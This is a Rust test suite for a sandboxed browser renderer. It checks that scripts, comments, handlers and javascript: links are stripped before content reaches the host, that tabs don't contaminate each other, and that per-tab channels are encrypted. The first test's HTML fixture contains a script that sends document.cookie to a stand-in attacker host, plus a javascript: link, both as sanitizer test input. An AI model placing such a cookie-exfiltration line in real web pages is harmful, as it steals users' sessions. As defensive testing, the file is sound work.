//! Executable proofs of what the zero-knowledge tab boundary actually guarantees.
//!
//! Each test pins down ONE property the host relies on. Read together with
//! `docs/ZKVM_THREAT_MODEL.md`, which states what is proven here and — just as
//! importantly — what is NOT (same-process memory isolation, fetch-in-boundary).
//!
//! The claim these tests support is narrow and true: the host's render path only
//! ever receives a sanitized display list across an encrypted, tamper-evident,
//! per-tab channel, and the renderer is a pure function with no cross-tab state.
//! They do NOT claim OS/hardware memory isolation — see the threat model.

use citadel_tabs::{render_in_isolation, DisplayKind, RenderRequest};
use citadel_zkvm::channel::SecureChannel;
use citadel_zkvm::{Channel, ChannelMessage};
use std::time::Duration;

fn req(html: &str) -> RenderRequest {
    RenderRequest {
        url: "https://tab.example/".to_string(),
        html: html.to_string(),
        viewport_width: 800.0,
    }
}

/// PROOF 1 — Boundary minimality.
///
/// The ENTIRE payload that crosses VM→host is `RenderedContent`. We serialize it
/// (exactly what the host deserializes) and prove that none of the page's
/// dangerous or hidden material — scripts, script bodies, comments, event
/// handlers, custom data-* attributes, raw tags, or dangerous URL schemes — is
/// present. The host therefore cannot reconstruct markup or scripts, or read
/// hidden attributes, from what it receives. Only visible text survives.
#[test]
fn only_sanitized_display_list_crosses_the_boundary() {
    let html = r#"<!doctype html><html><head><title>Secret Title</title>
        <script>var EXFIL_TOKEN="sk-live-abc123"; fetch("//evil.example/"+document.cookie);</script>
        <style>body{content:"CSS_SECRET"}</style>
        <!-- HIDDEN_COMMENT: internal note -->
        </head><body>
        <h1 onclick="STEAL_HANDLER()" data-tracking-id="USER-7788">Visible Heading</h1>
        <p>Visible paragraph.</p>
        <a href="javascript:RUN_SECRET()">danger link</a>
        <a href="https://ok.example/x">safe link</a>
        </body></html>"#;

    let rendered = render_in_isolation(&req(html));

    // This string is the complete information the host obtains about the tab.
    let crosses_boundary = serde_json::to_string(&rendered).expect("serialize");

    let must_not_leak = [
        "EXFIL_TOKEN",
        "sk-live-abc123",
        "document.cookie",
        "evil.example",
        "CSS_SECRET",
        "HIDDEN_COMMENT",
        "STEAL_HANDLER",
        "onclick",
        "data-tracking-id",
        "USER-7788",
        "RUN_SECRET",
        "javascript:",
        "<script",
        "<style",
        "<h1",
        "<p",
        "<!--",
    ];
    for needle in must_not_leak {
        assert!(
            !crosses_boundary.contains(needle),
            "BOUNDARY LEAK: host received '{needle}' across the boundary:\n{crosses_boundary}"
        );
    }

    // Visible text DID make it through (so this isn't trivially empty).
    let texts: Vec<&str> = rendered
        .display_list
        .iter()
        .map(|i| i.text.as_str())
        .collect();
    assert!(texts.iter().any(|t| t.contains("Visible Heading")));
    assert!(texts.iter().any(|t| t.contains("Visible paragraph")));
    // The safe link survives WITH its href; the dangerous one is present as text
    // only, href stripped.
    let safe = rendered
        .display_list
        .iter()
        .find(|i| i.text.contains("safe link"))
        .unwrap();
    assert_eq!(safe.href.as_deref(), Some("https://ok.example/x"));
    let danger = rendered
        .display_list
        .iter()
        .find(|i| i.text.contains("danger link"))
        .unwrap();
    assert_eq!(
        danger.href, None,
        "javascript: href must not cross the boundary"
    );
}

/// PROOF 2 — The renderer is a pure function with no cross-tab state.
///
/// Two different tabs are rendered concurrently, many times, interleaved across
/// threads. Each render must always equal its own isolated single-shot result.
/// If the renderer held shared/global state, concurrent A and B renders would
/// contaminate each other. They don't.
#[test]
fn renderer_is_pure_with_no_cross_tab_contamination() {
    const HTML_A: &str = "<html><body><h1>TAB-ALPHA</h1><p>alpha body</p></body></html>";
    const HTML_B: &str = "<html><body><h1>TAB-BRAVO</h1><p>bravo body</p></body></html>";

    let canonical = |html: &str| -> Vec<String> {
        render_in_isolation(&req(html))
            .display_list
            .into_iter()
            .map(|i| i.text)
            .collect()
    };
    let want_a = canonical(HTML_A);
    let want_b = canonical(HTML_B);
    assert!(want_a.iter().any(|t| t == "TAB-ALPHA"));
    assert!(want_b.iter().any(|t| t == "TAB-BRAVO"));
    // Cross-check: tab A's output never mentions tab B's content and vice versa.
    assert!(!want_a
        .iter()
        .any(|t| t.contains("BRAVO") || t.contains("bravo")));
    assert!(!want_b
        .iter()
        .any(|t| t.contains("ALPHA") || t.contains("alpha")));

    let mut handles = Vec::new();
    for n in 0..64 {
        let (html, want) = if n % 2 == 0 {
            (HTML_A, want_a.clone())
        } else {
            (HTML_B, want_b.clone())
        };
        handles.push(std::thread::spawn(move || {
            let got: Vec<String> = render_in_isolation(&req(html))
                .display_list
                .into_iter()
                .map(|i| i.text)
                .collect();
            assert_eq!(got, want, "cross-tab contamination or non-determinism");
        }));
    }
    for h in handles {
        h.join().expect("render thread panicked");
    }
}

/// PROOF 3 — The channel is confidential and tamper-evident (AEAD), and a
/// different tab's key cannot read another tab's traffic.
///
/// This is the property that makes the boundary meaningful if the renderer is
/// ever moved to a separate process / enclave: the bytes in transit are opaque
/// and authenticated.
#[test]
fn channel_payloads_are_encrypted_authenticated_and_per_tab() {
    let tab_a_key = [0x11u8; 32];
    let tab_a = SecureChannel::new(tab_a_key);

    let private = b"tab-private: user is reading https://intranet.example/salaries";
    let sealed = tab_a.encrypt(private).expect("encrypt");

    // Confidentiality: the plaintext does not appear anywhere in the ciphertext.
    assert!(
        !sealed.windows(private.len()).any(|w| w == private),
        "plaintext leaked into ciphertext"
    );
    // Round-trips for the legitimate holder.
    assert_eq!(tab_a.decrypt(&sealed).expect("decrypt"), private);

    // Integrity / fail-closed: flip one byte → authentication fails, no plaintext.
    let mut tampered = sealed.clone();
    if let Some(last) = tampered.last_mut() {
        *last ^= 0xFF;
    }
    assert!(
        tab_a.decrypt(&tampered).is_err(),
        "AEAD must reject tampered ciphertext"
    );

    // Cross-tab: a different tab's key cannot decrypt tab A's traffic.
    let tab_b = SecureChannel::new([0x22u8; 32]);
    assert!(
        tab_b.decrypt(&sealed).is_err(),
        "another tab must not read this tab's channel"
    );
}

/// PROOF 4 — Tabs ride independent channels; one tab's VM never observes another
/// tab's traffic.
#[tokio::test]
async fn cross_tab_channels_are_isolated_buses() {
    let (a_host, mut a_vm) = Channel::new().expect("tab A channel");
    let (_b_host, mut b_vm) = Channel::new().expect("tab B channel");

    a_host
        .send(ChannelMessage::Control {
            command: "render_page".to_string(),
            params: "{\"tabA\":\"private\"}".to_string(),
        })
        .await
        .expect("send on tab A");

    // Tab A's VM receives tab A's message.
    let got = tokio::time::timeout(Duration::from_secs(2), a_vm.receive())
        .await
        .expect("tab A VM should receive promptly")
        .expect("decode");
    match got {
        ChannelMessage::Control { command, .. } => assert_eq!(command, "render_page"),
        other => panic!("unexpected: {other:?}"),
    }

    // Tab B's VM must see NOTHING — it is a different bus. receive() blocks until
    // timeout, proving no leakage across tabs.
    let leaked = tokio::time::timeout(Duration::from_millis(300), b_vm.receive()).await;
    assert!(leaked.is_err(), "tab B VM must not observe tab A's traffic");
}

/// PROOF 5 — The host-visible type is structurally incapable of carrying a DOM,
/// scripts, or raw bytes. A page whose only content is dangerous yields an empty
/// display list — the host receives no usable page material at all.
#[test]
fn host_visible_type_carries_only_display_primitives() {
    let only_danger = r#"<html><head><script>EVIL()</script><style>x{}</style></head>
        <body><script>MORE_EVIL()</script></body></html>"#;
    let rendered = render_in_isolation(&req(only_danger));

    assert!(
        rendered.display_list.is_empty(),
        "a script/style-only page must produce no visible runs, got {:?}",
        rendered.display_list
    );
    assert!(
        rendered.security_metadata.blocked_elements >= 1,
        "boundary recorded the pruning"
    );

    // Every field of RenderedContent is a display primitive or metadata — there is
    // no DOM handle, no raw html, no script field to carry tab internals.
    for item in &rendered.display_list {
        let _: DisplayKind = item.kind; // kind/text/href/geometry/style only
    }
}
